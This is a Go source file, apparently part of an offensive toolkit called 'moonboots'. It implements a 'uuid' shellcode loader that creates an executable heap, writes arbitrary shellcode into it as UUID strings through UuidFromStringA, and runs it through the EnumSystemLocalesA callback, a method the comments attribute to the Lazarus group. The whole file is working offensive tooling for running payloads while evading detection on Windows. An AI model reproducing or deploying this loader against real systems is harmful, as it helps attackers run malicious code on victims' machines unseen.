package loaders

import (
	"bytes"
	"encoding/binary"
	"fmt"
	guuid "github.com/google/uuid"
	"github.com/ma111e/moonboots/internal/consts"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

// Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

/*
	This technique executes shellcode in the current process using the following steps:
		1. Create a Heap and allocate space
		2. Convert shellcode into an array of UUIDs
		3. Load the UUIDs into memory (on the allocated heap) by (ab)using the UuidFromStringA function
		4. Execute the shellcode by (ab)using the EnumSystemLocalesA function
*/

// Reference: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala

const (
	LdrUUID = "uuid"
)

type UUIDLoader struct {
	Base
}

func init() {
	AvailableLoaders.Register(LdrUUID, &UUIDLoader{})
}

func (ldr UUIDLoader) ValidArchs() []string {
	return consts.VALID_ARCH_AMD64
}

func (ldr UUIDLoader) Run(shellcode []byte) error {
	// Convert shellcode to UUIDs
	log.Debugln("Converting shellcode to slice of UUIDs")

	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		return err
	}

	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")

	/* https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
		HANDLE HeapCreate(
			DWORD  flOptions,
			SIZE_T dwInitialSize,
			SIZE_T dwMaximumSize
		);
	  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	*/

	// Create the heap
	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		return fmt.Errorf("there was an error calling the HeapCreate function: %s", err)

	}

	log.Printf("Heap created at: 0x%x", heapAddr)

	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
		HANDLE hHeap,
		DWORD  dwFlags,
		SIZE_T dwBytes
		);
	*/

	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		return fmt.Errorf("there was an error calling the HeapAlloc function: %s", err)
	}

	log.Printf("Heap allocated: 0x%x", addr)

	log.Debugln("Iterating over UUIDs and calling UuidFromStringA...")

	/*
		RPC_STATUS UuidFromStringA(
		RPC_CSTR StringUuid,
		UUID     *Uuid
		);
	*/

	addrPtr := addr
	for _, uuid := range uuids {
		// Must be an RPC_CSTR which is null terminated
		uuidStr := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&uuidStr[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			return fmt.Errorf("There was an error calling UuidFromStringA: %s", err)
		}

		addrPtr += 16
	}
	log.Println("Completed loading UUIDs to memory with UuidFromStringA")

	/*
		BOOL EnumSystemLocalesA(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/

	// Execute Shellcode
	log.Debugln("Calling EnumSystemLocalesA to execute shellcode")
	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		return fmt.Errorf("EnumSystemLocalesA GetLastError: %s", err)
	}
	log.Println("Executed shellcode")

	return nil
}

// shellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
// converts the first 8 bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
func shellcodeToUUID(shellcode []byte) ([]string, error) {
	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems necessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		uuidStr, err := guuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUIDLoader: %s", err)
		}

		uuids = append(uuids, uuidStr.String())
	}
	return uuids, nil
}
